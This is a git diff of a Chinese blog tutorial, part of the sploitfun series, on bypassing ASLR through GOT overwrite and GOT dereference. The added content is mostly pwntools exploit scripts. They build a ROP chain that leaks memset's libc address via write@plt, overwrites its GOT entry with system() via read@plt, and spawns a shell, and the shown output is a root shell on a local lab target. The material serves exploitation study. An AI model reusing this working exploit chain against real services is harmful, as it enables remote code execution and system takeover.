@@ -2,7 +2,7 @@
 layout: post
 title: 通过GOT overwrite 和GOT dereference绕过ASLR
 excerpt: "sploitfun系列教程之2.3.3 GOT overwrite 和GOT dereference"
-categories: [未完待续]
+categories: [sploitfun系列教程]
 comments: true
 ---
 
@@ -132,6 +132,7 @@ objdump -R leak | grep memset
 ```
 查看write的plt
 ```
+objdump -d leak|less
 0000000000400540 <write@plt>:
   400540:       ff 25 d2 0a 20 00       jmpq   *0x200ad2(%rip)        # 601018 <write@GLIBC_2.2.5>
   400546:       68 00 00 00 00          pushq  $0x0
@@ -160,5 +161,127 @@ Dump of assembler code for function helper:
 ```
 leak出memset()'[GOT]的exp为
 ```python
+from pwn import *
+
+write_plt  = 0x400540            # address of write@plt
+memset_got = 0x601030            # memset()'s GOT entry
+pop3ret    = 0x4006a1            # gadget to pop rdi; pop rsi; pop rdx; ret
+
+payload ="A"*168 + p64(pop3ret)+p64(1)+p64(memset_got)+p64(8)+p64(write_plt)
+r = remote("127.0.0.1",4000)
+raw_input('#')
+print r.recvuntil('input: ')
+r.sendline(payload)
+print (r.recvline())
+print '===='
+memset=u64(r.recv(8))
+print hex(memset)
+
+```
+查找system和memset的offset
+```
+ldd leak
+	linux-vdso.so.1 =>  (0x00007ffd065f6000)
+	libc.so.6 => /lib64/libc.so.6 (0x00007f7802897000)
+	/lib64/ld-linux-x86-64.so.2 (0x00007f7802c65000)
+```
+`objdump -d /lib64/libc.so.6 |less`或者`readelf -s /lib64/libc.so.6 |less`
+```
+0000000000043270 <__libc_system>:
+   43279:	74 15                	je     43290 <__libc_system+0x20>
+   43283:	75 26                	jne    432ab <__libc_system+0x3b>
+000000000008f8c0 <memset>:
+   8f8c7:	48 8d 05 c2 ac 00 00 	lea    0xacc2(%rip),%rax        # 9a590 <__memset_x86_64>
+   8f8d8:	74 26                	je     8f900 <memset+0x40>
+
+```
+打印出system的地址
+```python
+from pwn import *
+
+write_plt  = 0x400540            # address of write@plt
+memset_got = 0x601030            # memset()'s GOT entry
+pop3ret    = 0x4006a1            # gadget to pop rdi; pop rsi; pop rdx; ret
+
+memset_off = 0x08f8c0            # memset()'s offset in libc.so.6
+system_off = 0x043270            # system()'s offset in libc.so.6
+
+payload ="A"*168 + p64(pop3ret)+p64(1)+p64(memset_got)+p64(8)+p64(write_plt)
+r = remote("127.0.0.1",4000)
+raw_input('#')
+print r.recvuntil('input: ')
+r.sendline(payload)
+print (r.recvline())
+print '===='
+memset=u64(r.recv(8))
+print hex(memset)
+
+print (hex(memset-memset_off+system_off))
+```
+之后我们使用read@plt来覆盖memset()的 GOT值,使用read@plt写入 “sh”,将RDI指针指向“sh”,并调用system函数
+
+
+#### c语言中的read和write
+```
+#include<stdio.h>
+#define MAXSIZE 10
+int main(void)
+{
+ char c;
+ char buf[MAXSIZE];
+ int n;
+ while((n = read(0,buf,MAXSIZE)) > 0)
+  write(1,buf,n);//
+}
+```
+最终的exp
+```python
+from pwn import *
+
+read_plt   = 0x400580            # address of read@plt
+write_plt  = 0x400540            # address of write@plt
+memset_plt = 0x400570
+memset_got = 0x601030            # memset()'s GOT entry
+pop3ret    = 0x4006a1            # gadget to pop rdi; pop rsi; pop rdx; ret
+
+memset_off = 0x08f920            # memset()'s offset in libc.so.6
+system_off = 0x043270            # system()'s offset in libc.so.6
+
+writeable  = 0x601000            # location to write "/bin/sh" to
+
+payload ="A"*168 + p64(pop3ret)+p64(1)+p64(memset_got)+p64(8)+p64(write_plt)    #leak memset()'s libc address using write@plt
+payload+=p64(pop3ret)+p64(0)+p64(memset_got)+p64(8)+p64(read_plt)               #overwrite memset()'s GOT entry using read@plt
+payload+=p64(pop3ret)+p64(0)+p64(writeable)+p64(8)+p64(read_plt)               #read "/bin/sh" into 0x601000 using read@plt
+payload+=p64(pop3ret)+p64(writeable)+p64(1)+p64(1)+p64(memset_plt)              #set RDI to location of "/bin/sh", and call system()
+r = remote("127.0.0.1",4000)
+raw_input('#')
+print r.recvuntil('input: ')
+r.sendline(payload)
+r.recvline()
+memset=u64(r.recv(8))
+print hex(memset)
+
+print (hex(memset-memset_off+system_off))
+
+#r.sendline('AAAABBBB')
+#raw_input('#')
+r.send(p64(memset-memset_off+system_off))
+r.send(p64(0x6873))
+raw_input('#')
+r.interactive()
+
+```
+最终的结果
+```
+python mortyexp.py 
+[+] Opening connection to 127.0.0.1 on port 4000: Done
+#
+Enter input: 
+0x7f92ef091920
+0x7f92ef045270
+#
+[*] Switching to interactive mode
+$ id
+uid=0(root) gid=0(root) 组=0(root)
 
 ```
